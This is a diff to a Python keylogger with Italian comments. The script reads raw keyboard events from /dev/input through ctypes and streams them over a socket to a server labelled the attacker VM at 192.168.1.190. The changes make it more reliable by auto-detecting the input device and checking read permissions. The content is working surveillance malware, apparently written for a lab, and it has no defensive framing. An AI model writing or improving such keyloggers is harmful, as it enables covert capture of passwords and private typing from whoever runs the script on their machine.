@@ -2,6 +2,7 @@ import socket
 import ctypes
 import ctypes.util
 import sys
+import os
 
 # Configura l'indirizzo IP e la porta del server di destinazione (VM attaccante)
 SERVER_IP = '192.168.1.190'
@@ -22,12 +23,27 @@ class InputEvent(ctypes.Structure):
                 ("value", ctypes.c_int32)]
 
 EV_KEY = 0x01
-input_device = "/dev/input/event0"  # Assicurati che questo sia il dispositivo corretto
+
+# Trova il dispositivo di input corretto
+input_device = None
+for event_file in os.listdir('/dev/input/'):
+    if 'event' in event_file:
+        input_device = f"/dev/input/{event_file}"
+        break
+
+if input_device is None:
+    print("Nessun dispositivo di input trovato")
+    sys.exit(1)
+
+# Verifica i permessi sul dispositivo di input
+if not os.access(input_device, os.R_OK):
+    print(f"Permessi insufficienti per leggere {input_device}")
+    sys.exit(1)
 
 # Apri il dispositivo di input
 fd = libc.open(input_device.encode('utf-8'), 0)
 if fd < 0:
-    print("Impossibile aprire il dispositivo di input")
+    print(f"Impossibile aprire il dispositivo di input: {input_device}")
     sys.exit(1)
 
 event = InputEvent()
@@ -40,3 +56,4 @@ while True:
 
 # Chiude la connessione socket quando il listener si interrompe
 sock.close()
+
